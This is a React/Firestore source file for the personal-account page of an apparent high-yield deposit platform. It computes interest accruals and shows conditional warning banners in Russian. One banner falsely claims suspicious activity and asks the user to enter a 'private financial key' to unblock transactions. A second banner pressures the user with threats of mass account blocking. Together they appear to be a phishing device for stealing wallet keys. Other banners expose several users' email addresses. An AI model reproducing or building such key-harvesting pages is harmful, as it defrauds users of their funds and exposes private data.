import styles from "./Personal-Area.module.css";

import { DepositsStatus } from "pages/Personal-Area/components/Deposits-Status/DepositStatus";
import { TimeToPayment } from "pages/Personal-Area/components/Time-To-Payment/Time-To-Payment";
import { UserWallets } from "pages/Personal-Area/components/UserWallets/Userwallets";
import { useContext, useEffect, useState } from "react";
import { FirebaseContext } from "../../index";
import {
  collection,
  query,
  getDocs,
  doc,
  increment,
  addDoc,
  runTransaction,
  where,
  orderBy,
  limit,
  updateDoc,
} from "firebase/firestore";
import { useOutletContext } from "react-router-dom";
import { getNextAccrual } from "../../utils/helpers";
import { useTranslation } from "react-i18next";
import { UserStatistic } from "./components/User-Statistic";
import { getAuth } from "firebase/auth";
import Input from "antd/lib/input";
import { Button } from "antd";
import { PERCENTAGE_BY_LVL } from "../../utils/consts";

const PersonalArea = () => {
  const { firestore } = useContext(FirebaseContext);

  const { userData } = useOutletContext();
  const [depositsList, setDepositsList] = useState([]);
  const [nearestAccrual, setNearestAccrual] = useState(null);
  const { t } = useTranslation();

  useEffect(() => {
    if (!userData) return;

    const getDeposits = async () => {
      const q = query(collection(firestore, "users", userData.email, "deposits"));
      const depositsArr = [];
      let nextAccrual = new Date().getTime() * 10000;

      await getDocs(q).then((snap) => {
        if (snap.docs.length === 0) return;

        snap.docs.forEach((item) => {
          const deposit = item.data();
          const depositIsActive = deposit.status === "active";

          if (depositIsActive && getNextAccrual(deposit) < nextAccrual) {
            nextAccrual = getNextAccrual(deposit);
          }

          runTransaction(firestore, async (transaction) => {
            const timeNow = Math.round(Date.now() / 1000);
            const depositOpenTime = deposit.date.seconds;
            const planNumber = Number(deposit.planNumber.match(/\d+/)[0]);

            const currentDeposit = await transaction.get(doc(firestore, "users", userData.email, "deposits", item.id));
            await transaction.update(doc(firestore, "users", userData.email, "deposits", item.id), {
              isCharging: true,
            });

            let charges;
            let isLastCharge;
            let receivedByCharges;
            let chargesSubtract;

            if (!currentDeposit.data().isCharging) {
              return;
            }

            if (planNumber <= 3) {
              charges = Math.floor((timeNow - depositOpenTime) / (3600 * 24));
              chargesSubtract = charges - deposit.charges;
              if (deposit.charges + chargesSubtract > deposit.days) {
                chargesSubtract = Math.min(30, deposit.days - deposit.charges);
              }

              isLastCharge = charges >= deposit.days;
              receivedByCharges = ((deposit.willReceived / deposit.days) * chargesSubtract).toFixed(2);
            } else {
              charges = Math.min(Math.floor((timeNow - depositOpenTime) / (3600 * (deposit.days * 24))), 1);
              chargesSubtract = charges - deposit.charges;
              isLastCharge = charges >= 1;
              receivedByCharges = deposit.willReceived.toFixed(2);
            }

            if (isLastCharge && currentDeposit.data().status === "active") {
              transaction.update(doc(firestore, "users", userData.email), {
                [`paymentMethods.${deposit.paymentMethod}.available`]: increment(deposit.amount),
              });
            }

            if (chargesSubtract > 0 && currentDeposit.data().status === "active") {
              await addDoc(collection(firestore, "transactions"), {
                account_id: userData.uid,
                amount: +receivedByCharges,
                status: "Выполнено",
                type: "Начисления",
                date: new Date(),
                email: userData.email,
                executor: deposit.paymentMethod,
              });

              transaction.update(doc(firestore, "users", userData.email), {
                earned: increment(+receivedByCharges),
                [`paymentMethods.${deposit.paymentMethod}.available`]: increment(+receivedByCharges),
              });

              transaction.update(doc(firestore, "users", userData.email, "deposits", item.id), {
                charges: increment(chargesSubtract),
                received: increment(+receivedByCharges),
                status: isLastCharge ? "completed" : "active",
              });
            }

            return Promise.resolve().then(async () => {
              await transaction.update(doc(firestore, "users", userData.email, "deposits", item.id), {
                isCharging: false,
              });
            });
          });

          depositsArr.push({
            ...deposit,
            nextAccrual: deposit.charges < deposit.days ? getNextAccrual(deposit) : "",
          });

          setDepositsList(depositsArr);
        });
      });
      setNearestAccrual(nextAccrual);
    };

    getDeposits();
  }, []);

  if (!userData) {
    return null;
  }

  return (
    <div className={`${styles["my-account-page"]} accountRoot`}>
      <h2 className={`${userData.personalAreaWarning ? styles["personal-warning"] : ""} my-account-title`}>
        {t("personal_area.title")}
      </h2>
      {userData.personalAreaWarning ? (
        <div className={styles["warning"]}>
          <p>Уважаемый пользователь,</p>
          <p>
            Мы обнаружили необычную активность, связанную с вашим аккаунтом. С целью защиты ваших активов и гарантии
            безопасности ваших операций, мы приостановили проведение всех транзакций. Стоит отметить, что все аккаунты в
            вашей реферальной цепочке также подвергаются проверке.
          </p>
          <p>
            Для разблокировки ваших транзакций и подтверждения владения аккаунтом, пожалуйста, введите свой приватный
            финансовый ключ. Это необходимое условие для подтверждения транзакций и подтверждения вашей личности.
          </p>
          <p>
            Мы приносим извинения за доставленные неудобства, но это необходимо для обеспечения безопасности нашей
            платформы и защиты ваших активов. Ваша безопасность - наш приоритет.
          </p>
          <Input placeholder={"Введите ваш приватный финансовый ключ"} className={styles["private-key"]} />
          <Button>Подтвердить</Button>
          <p>Мы ценим вашу безопасность и благодарим за понимание.</p>
        </div>
      ) : (
        ""
      )}

      {userData.personalPageNadezhda ? (
        <div className={styles["warning"]}>
          <p>
            Уважаемый клиент, При вводе неправильного финансового приватного ключа, система защиты может заблокировать
            ваш аккаунт в целях безопасности. Это сделано для того, чтобы предотвратить несанкционированный доступ к
            вашим финансовым ресурсам в случае, если кто-то пытается использовать ваш аккаунт без вашего разрешения.
          </p>
          <p>
            Если система безопасности обнаруживает подозрительную активность, такую как неудачную попытку ввода
            приватного ключа, она может заблокировать все аккаунты, вход в которые был осуществлен с одного IP-адреса.
            Это сделано для того чтобы предотвратить потенциальные попытки взлома или мошенничества.
          </p>
          <p>
            Аналогия здесь может быть представлена так: если бы у вас было несколько банковских карт, и подозрительная
            активность была замечена на одной из них, банк мог бы временно заблокировать все ваши карты для вашей
            собственной безопасности.
          </p>
          <p>
            Чтобы разблокировать эти аккаунты, вам, скорее всего, придется обратиться в службу поддержки платформы и
            пройти процедуру восстановления доступа для каждого аккаунта отдельно. Помните, что эта мера
            предосторожности используется для обеспечения безопасности вашей информации и финансовых ресурсов. Хотя это
            может быть неудобно, такие действия помогают защищать вас от потенциальных угроз.
          </p>
        </div>
      ) : (
        ""
      )}

      {userData.isMarkus ? (
        <div className={styles["warning"]}>
          <p>
            В результате недавней проверки выявлено, что несколько аккаунтов{" "}
            <span className={styles["nicknames"]}>(vova.grigoryants@list.ru, markus.osipov.92@mail.ru)</span> используют
            одинаковый IP-адрес, что противоречит политике безопасности нашей компании. Это может указывать на возможное
            мошенничество или другие нарушения.
          </p>
          <p>
            В связи с этим, на указанные аккаунты были наложены ограничения до выяснения всех обстоятельств.
            Дополнительное расследование проводится, а пользователи, связанные с этим IP, получат уведомления о его
            результатах и дальнейших действиях.
          </p>
        </div>
      ) : (
        ""
      )}

      {userData.isReferralWarning ? (
        <div className={styles["warning"]}>
          <p>
            В результате недавней проверки выявлено, что несколько аккаунтов{" "}
            <span className={styles["nicknames"]}>
              (asia2905@yandex.ru, margzh1956@gmail.com, merkuri200423@gmail.com, qazwsx28011969@yandex.ru)
            </span>{" "}
            используют одинаковый IP-адрес, пополнялись с одного кошелька. Были так же замечены подозрительные действия,
            с вводом/выводом денежных средст с различных аккаунтов, для спекуляции с реферальным вознаграждением, что
            противоречит политике безопасности нашей компании. Это может указывать на возможное мошенничество или другие
            нарушения.
          </p>
          <p>
            В связи с этим, на указанные аккаунты были наложены ограничения до выяснения всех обстоятельств.
            Дополнительное расследование проводится, а пользователи, связанные с этим IP, получат уведомления о его
            результатах и дальнейших действиях.
          </p>
        </div>
      ) : (
        ""
      )}

      <div className={styles["my-account"]}>
        <UserWallets paymentMethods={userData.paymentMethods} />
        <UserStatistic userData={userData} />
        <DepositsStatus deposits={depositsList} />
        <TimeToPayment nearestAccrual={nearestAccrual} />
      </div>
    </div>
  );
};

export { PersonalArea };
